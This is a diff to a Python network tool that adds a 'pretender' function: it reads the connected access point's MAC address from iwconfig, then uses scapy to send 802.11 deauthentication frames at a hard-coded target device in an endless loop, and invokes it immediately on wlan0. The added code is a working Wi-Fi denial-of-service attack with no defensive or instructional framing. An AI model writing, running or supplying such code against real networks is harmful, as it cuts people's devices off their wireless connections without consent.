@@ -2,7 +2,9 @@ from socket import gethostbyaddr
 import pywifi
 from time import sleep
 from os import system
-from scapy.all import ARP,Ether,srp
+from scapy.all import ARP,Ether,srp,Dot11,Dot11Deauth,sendp,RadioTap
+from subprocess import run
+from threading import Thread
 
 system('clear')
 
@@ -126,5 +128,21 @@ def get_con_devs(ip:str,net_iface:str):
         psrc - To find device if connected to network
         hwsrc - To find the target mac
         '''
-        print(f'Device ip : {received.psrc}\nDevice mac : {received.hwsrc}\nHost : {hostname(received.psrc)}') 
+        print(f'Device ip : {received.psrc}\nDevice mac : {received.hwsrc}\nHost : {hostname(received.psrc)}\n') 
 
+def pretender(target_mac:str,net_iface:str):
+    try:
+        find_AP = run('iwconfig',text=True,shell=True,capture_output=True)
+        ap_index = (find_AP.stdout.index('Access Point'),find_AP.stdout.index('ESSID'))
+        ap = find_AP.stdout[ap_index[0]:].split(' ')[2]
+        ap_name = find_AP.stdout[ap_index[1]:].split()[0].split(':')[1] + ' ' + find_AP.stdout[ap_index[1]:].split()[1].replace('"','')
+        print(f'Access point found:\nAP Name : {ap_name.replace('"','')}\nAP MAC : {ap}')
+
+        deauth_pack = RadioTap() / Dot11(addr1=target_mac,addr2=ap,addr3=ap) / Dot11Deauth(reason=7)
+
+        sendp(deauth_pack,iface=net_iface,loop=1,inter=0.1,verbose=1)
+    except Exception as e:
+        print(f'Error occur : {e}')
+
+pretender('90:00:db:0f:70:29','wlan0')
+# get_con_devs('192.168.28.0/24','wlan0')
